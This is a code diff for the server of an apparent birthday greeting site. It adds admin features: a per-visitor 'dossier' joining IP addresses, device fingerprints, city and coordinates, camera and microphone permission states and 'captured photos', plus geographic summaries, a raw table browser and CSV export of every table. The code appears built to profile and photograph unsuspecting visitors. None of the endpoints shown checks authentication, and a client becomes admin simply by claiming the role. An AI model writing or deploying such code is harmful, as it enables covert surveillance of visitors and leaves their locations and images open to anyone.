@@ -18,6 +18,50 @@ fs.mkdirSync(uploadsDir, { recursive: true });
 fs.mkdirSync(musicDir, { recursive: true });
 fs.mkdirSync(photosDir, { recursive: true });
 
+const DB_PATH = path.join(__dirname, 'data', 'birthday.db');
+const DB_TABLES = ['visitors', 'photos', 'wishes', 'quiz_scores', 'devices', 'captured_photos', 'music_tracks', 'activity_log', 'site_settings', 'planner_items', 'surprise_config'];
+
+function intParam(value, fallback, min, max) {
+  const n = parseInt(value, 10);
+  if (!Number.isFinite(n)) return fallback;
+  return Math.min(Math.max(n, min), max);
+}
+
+function dirStats(dir) {
+  let bytes = 0;
+  let count = 0;
+  let entries = [];
+  try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch (_) { return { count, bytes }; }
+  for (const entry of entries) {
+    const full = path.join(dir, entry.name);
+    if (entry.isDirectory()) {
+      const nested = dirStats(full);
+      bytes += nested.bytes;
+      count += nested.count;
+    } else {
+      try {
+        bytes += fs.statSync(full).size;
+        count += 1;
+      } catch (_) {}
+    }
+  }
+  return { count, bytes };
+}
+
+function csvCell(value) {
+  if (value === null || value === undefined) return '';
+  const text = String(value);
+  return /[",\r\n]/.test(text) ? '"' + text.replace(/"/g, '""') + '"' : text;
+}
+
+function sendCsv(res, filename, columns, rows) {
+  const lines = [columns.map(csvCell).join(',')];
+  rows.forEach(row => lines.push(columns.map(col => csvCell(row[col])).join(',')));
+  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+  res.send('\uFEFF' + lines.join('\r\n'));
+}
+
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true }));
 app.use('/uploads', express.static(uploadsDir));
@@ -43,6 +87,11 @@ io.on('connection', (socket) => {
   console.log('Socket connected:', socket.id);
 
   socket.on('visitor-joined', (data) => {
+    if (data && data.role === 'admin') {
+      socket.data.isAdmin = true;
+      socket.emit('visitor-count', connectedVisitors.size);
+      return;
+    }
     connectedVisitors.set(socket.id, { ...data, joinedAt: Date.now() });
     io.emit('visitor-count', connectedVisitors.size);
     io.emit('admin-activity', { type: 'joined', data, time: Date.now() });
@@ -61,7 +110,7 @@ io.on('connection', (socket) => {
     const { visitorId, userAgent, browser, platform, screen, language, timezone, geo, camera, mic } = data;
     db.run(`INSERT INTO devices (visitorId, ip, userAgent, browser, platform, screen, language, timezone, country, city, latitude, longitude, cameraPermission, micPermission, geoPermission)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-      [visitorId, ip, userAgent, platform, browser, screen, language, timezone,
+      [visitorId, ip, userAgent, browser, platform, screen, language, timezone,
        geo?.country || null, geo?.city || null, geo?.lat || null, geo?.lng || null,
        camera || 'prompt', mic || 'prompt', geo ? 'granted' : 'prompt']);
     io.emit('admin-device', { visitorId, ip, ...data, time: Date.now() });
@@ -91,7 +140,22 @@ io.on('connection', (socket) => {
 
 // === Health ===
 app.get('/api/health', (_req, res) => {
-  res.json({ status: 'ok', visitors: connectedVisitors.size, time: new Date().toISOString() });
+  let dbBytes = 0;
+  try { dbBytes = fs.statSync(DB_PATH).size; } catch (_) {}
+  const uploadStats = dirStats(uploadsDir);
+  const mem = process.memoryUsage();
+  res.json({
+    status: 'ok',
+    visitors: connectedVisitors.size,
+    uptime: Math.floor(process.uptime()),
+    startedAt: new Date(Date.now() - process.uptime() * 1000).toISOString(),
+    time: new Date().toISOString(),
+    dbBytes,
+    uploads: uploadStats,
+    memory: { rss: mem.rss, heapUsed: mem.heapUsed, heapTotal: mem.heapTotal },
+    node: process.version,
+    platform: process.platform
+  });
 });
 
 // === Visitors ===
@@ -129,6 +193,33 @@ app.post('/api/devices', (req, res) => {
       if (err) return res.status(500).json({ error: err.message });
       res.status(201).json({ success: true, id: this.lastID });
     });
+});
+
+// === Device dossier (single visitor timeline) ===
+app.get('/api/devices/:visitorId/dossier', (req, res) => {
+  const visitorId = String(req.params.visitorId || '');
+  if (!visitorId) return res.status(400).json({ error: 'visitorId required.' });
+
+  db.all('SELECT * FROM devices WHERE visitorId = ? ORDER BY id DESC', [visitorId], (err, devices) => {
+    if (err) return res.status(500).json({ error: err.message });
+    db.all('SELECT * FROM activity_log WHERE visitorId = ? ORDER BY id DESC LIMIT 100', [visitorId], (err2, activity) => {
+      if (err2) return res.status(500).json({ error: err2.message });
+      db.all('SELECT * FROM captured_photos WHERE visitorId = ? ORDER BY id DESC', [visitorId], (err3, photos) => {
+        if (err3) return res.status(500).json({ error: err3.message });
+        const online = Array.from(connectedVisitors.values()).some(v => v && v.visitorId === visitorId);
+        res.json({
+          visitorId,
+          online,
+          device: devices[0] || null,
+          devices: devices || [],
+          activity: activity || [],
+          photos: photos || [],
+          firstSeen: devices.length ? devices[devices.length - 1].createdAt : null,
+          lastSeen: devices.length ? devices[0].createdAt : null
+        });
+      });
+    });
+  });
 });
 
 // === Captured Photos ===
@@ -232,10 +323,28 @@ app.delete('/api/music/:id', (req, res) => {
 });
 
 // === Activity Log ===
-app.get('/api/activity', (_req, res) => {
-  db.all('SELECT * FROM activity_log ORDER BY id DESC LIMIT 200', (err, rows) => {
+app.get('/api/activity', (req, res) => {
+  const limit = intParam(req.query.limit, 50, 1, 500);
+  const offset = intParam(req.query.offset, 0, 0, 1000000);
+  const q = String(req.query.q || '').trim();
+  const page = String(req.query.page || '').trim();
+  const action = String(req.query.action || '').trim();
+  const where = [];
+  const vals = [];
+  if (page) { where.push('page = ?'); vals.push(page); }
+  if (action) { where.push('action = ?'); vals.push(action); }
+  if (q) {
+    where.push('(action LIKE ? OR page LIKE ? OR details LIKE ? OR visitorId LIKE ? OR ip LIKE ?)');
+    const like = `%${q}%`;
+    vals.push(like, like, like, like, like);
+  }
+  const clause = where.length ? ` WHERE ${where.join(' AND ')}` : '';
+  db.get(`SELECT COUNT(*) c FROM activity_log${clause}`, vals, (err, countRow) => {
     if (err) return res.status(500).json({ error: err.message });
-    res.json(rows);
+    db.all(`SELECT * FROM activity_log${clause} ORDER BY id DESC LIMIT ? OFFSET ?`, [...vals, limit, offset], (err2, rows) => {
+      if (err2) return res.status(500).json({ error: err2.message });
+      res.json({ rows: rows || [], total: countRow ? countRow.c : 0, limit, offset });
+    });
   });
 });
 
@@ -363,34 +472,130 @@ app.put('/api/config', (req, res) => {
 });
 
 // === Summary (dashboard stats + charts) ===
-app.get('/api/summary', (_req, res) => {
-  const queries = {
-    visitors: 'SELECT COUNT(*) c FROM visitors',
-    devices: 'SELECT COUNT(*) c FROM devices',
-    wishes: 'SELECT COUNT(*) c FROM wishes',
-    photos: 'SELECT COUNT(*) c FROM captured_photos',
-    music: 'SELECT COUNT(*) c FROM music_tracks',
-    activity: 'SELECT COUNT(*) c FROM activity_log',
-    quiz: 'SELECT COUNT(*) c FROM quiz_scores',
-    tasksDone: 'SELECT COUNT(*) c FROM planner_items WHERE isDone=1',
-    tasksTotal: 'SELECT COUNT(*) c FROM planner_items'
-  };
-  const result = { counts: {}, byPage: [], byDay: [] };
-  let pending = Object.keys(queries).length;
-  Object.entries(queries).forEach(([key, sql]) => {
-    db.get(sql, (err, row) => {
-      result.counts[key] = row ? row.c : 0;
-      if (--pending === 0) {
-        db.all('SELECT page, COUNT(*) c FROM activity_log GROUP BY page ORDER BY c DESC', (e1, byPage) => {
-          result.byPage = byPage || [];
-          db.all("SELECT date(createdAt) d, COUNT(*) c FROM activity_log GROUP BY d ORDER BY d DESC LIMIT 14", (e2, byDay) => {
-            result.byDay = (byDay || []).reverse();
-            res.json(result);
-          });
-        });
-      }
+app.get('/api/summary', async (_req, res) => {
+  const get = (sql, params = []) => new Promise((resolve, reject) => {
+    db.get(sql, params, (err, row) => (err ? reject(err) : resolve(row)));
+  });
+  const all = (sql, params = []) => new Promise((resolve, reject) => {
+    db.all(sql, params, (err, rows) => (err ? reject(err) : resolve(rows)));
+  });
+
+  try {
+    const [
+      visitors, devices, uniqueVisitors, wishes, photos, legacyPhotos, music,
+      activity, quiz, tasksDone, tasksTotal, byPage, byDay, byPlatform, byBrowser,
+      todayActivity, countries, cities
+    ] = await Promise.all([
+      get('SELECT COUNT(*) c FROM visitors'),
+      get('SELECT COUNT(*) c FROM devices'),
+      get('SELECT COUNT(DISTINCT visitorId) c FROM devices WHERE visitorId IS NOT NULL'),
+      get('SELECT COUNT(*) c FROM wishes'),
+      get('SELECT COUNT(*) c FROM captured_photos'),
+      get('SELECT COUNT(*) c FROM photos'),
+      get('SELECT COUNT(*) c FROM music_tracks'),
+      get('SELECT COUNT(*) c FROM activity_log'),
+      get('SELECT COUNT(*) c FROM quiz_scores'),
+      get('SELECT COUNT(*) c FROM planner_items WHERE isDone=1'),
+      get('SELECT COUNT(*) c FROM planner_items'),
+      all('SELECT page, COUNT(*) c FROM activity_log WHERE page IS NOT NULL AND page != "" GROUP BY page ORDER BY c DESC LIMIT 8'),
+      all('SELECT date(createdAt) d, COUNT(*) c FROM activity_log GROUP BY d ORDER BY d DESC LIMIT 14'),
+      all('SELECT COALESCE(NULLIF(platform, ""), "Unknown") label, COUNT(*) c FROM devices GROUP BY label ORDER BY c DESC LIMIT 6'),
+      all('SELECT COALESCE(NULLIF(browser, ""), "Unknown") label, COUNT(*) c FROM devices GROUP BY label ORDER BY c DESC LIMIT 6'),
+      get('SELECT COUNT(*) c FROM activity_log WHERE date(createdAt) = date("now", "localtime")'),
+      all('SELECT country, COUNT(*) c FROM devices WHERE country IS NOT NULL AND country != "" GROUP BY country ORDER BY c DESC LIMIT 6'),
+      all('SELECT city, country, COUNT(*) c FROM devices WHERE city IS NOT NULL AND city != "" GROUP BY city, country ORDER BY c DESC LIMIT 6')
+    ]);
+
+    res.json({
+      counts: {
+        visitors: visitors ? visitors.c : 0,
+        devices: devices ? devices.c : 0,
+        uniqueVisitors: uniqueVisitors ? uniqueVisitors.c : 0,
+        wishes: wishes ? wishes.c : 0,
+        photos: (photos ? photos.c : 0) + (legacyPhotos ? legacyPhotos.c : 0),
+        music: music ? music.c : 0,
+        activity: activity ? activity.c : 0,
+        quiz: quiz ? quiz.c : 0,
+        tasksDone: tasksDone ? tasksDone.c : 0,
+        tasksTotal: tasksTotal ? tasksTotal.c : 0,
+        todayActivity: todayActivity ? todayActivity.c : 0
+      },
+      online: connectedVisitors.size,
+      byPage: byPage || [],
+      byDay: (byDay || []).reverse(),
+      byPlatform: byPlatform || [],
+      byBrowser: byBrowser || [],
+      countries: countries || [],
+      cities: cities || []
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// === Database explorer ===
+app.get('/api/db', async (_req, res) => {
+  try {
+    const tables = await Promise.all(DB_TABLES.map(table => new Promise((resolve, reject) => {
+      db.get(`SELECT COUNT(*) c FROM ${table}`, (err, row) => {
+        if (err) return reject(err);
+        resolve({ table, count: row ? row.c : 0 });
+      });
+    })));
+    res.json({ tables });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.get('/api/db/:table', (req, res) => {
+  const table = String(req.params.table || '');
+  if (!DB_TABLES.includes(table)) return res.status(404).json({ error: 'Unknown table.' });
+  const limit = intParam(req.query.limit, 50, 1, 500);
+  const offset = intParam(req.query.offset, 0, 0, 1000000);
+  const q = String(req.query.q || '').trim();
+
+  db.all(`PRAGMA table_info(${table})`, (err, cols) => {
+    if (err) return res.status(500).json({ error: err.message });
+    const columns = (cols || []).map(col => col.name);
+    let where = '';
+    let vals = [];
+    if (q) {
+      where = ' WHERE ' + columns.map(col => `CAST("${col}" AS TEXT) LIKE ?`).join(' OR ');
+      vals = columns.map(() => `%${q}%`);
+    }
+    db.get(`SELECT COUNT(*) c FROM ${table}${where}`, vals, (err2, countRow) => {
+      if (err2) return res.status(500).json({ error: err2.message });
+      db.all(`SELECT * FROM ${table}${where} ORDER BY id DESC LIMIT ? OFFSET ?`, [...vals, limit, offset], (err3, rows) => {
+        if (err3) return res.status(500).json({ error: err3.message });
+        res.json({ table, columns, rows: rows || [], total: countRow ? countRow.c : 0, limit, offset });
+      });
     });
   });
+});
+
+app.get('/api/db/:table/export.csv', (req, res) => {
+  const table = String(req.params.table || '');
+  if (!DB_TABLES.includes(table)) return res.status(404).json({ error: 'Unknown table.' });
+  db.all(`PRAGMA table_info(${table})`, (err, cols) => {
+    if (err) return res.status(500).json({ error: err.message });
+    const columns = (cols || []).map(col => col.name);
+    db.all(`SELECT * FROM ${table} ORDER BY id DESC`, (err2, rows) => {
+      if (err2) return res.status(500).json({ error: err2.message });
+      sendCsv(res, `${table}-${new Date().toISOString().slice(0, 10)}.csv`, columns, rows || []);
+    });
+  });
+});
+
+// === Broadcast (HTTP fallback for admin panel) ===
+app.post('/api/broadcast', (req, res) => {
+  const { title = '', message = '', type = 'info' } = req.body || {};
+  if (!message && type !== 'confetti') return res.status(400).json({ error: 'Message required.' });
+  const payload = { title, message, type, time: Date.now() };
+  io.emit('site-broadcast', payload);
+  db.run('INSERT INTO activity_log (visitorId, action, page, details, ip) VALUES (?, ?, ?, ?, ?)',
+    ['admin', 'broadcast', 'admin', message || type, req.ip]);
+  res.json({ success: true, broadcast: payload, online: connectedVisitors.size });
 });
 
 // === Database export ===
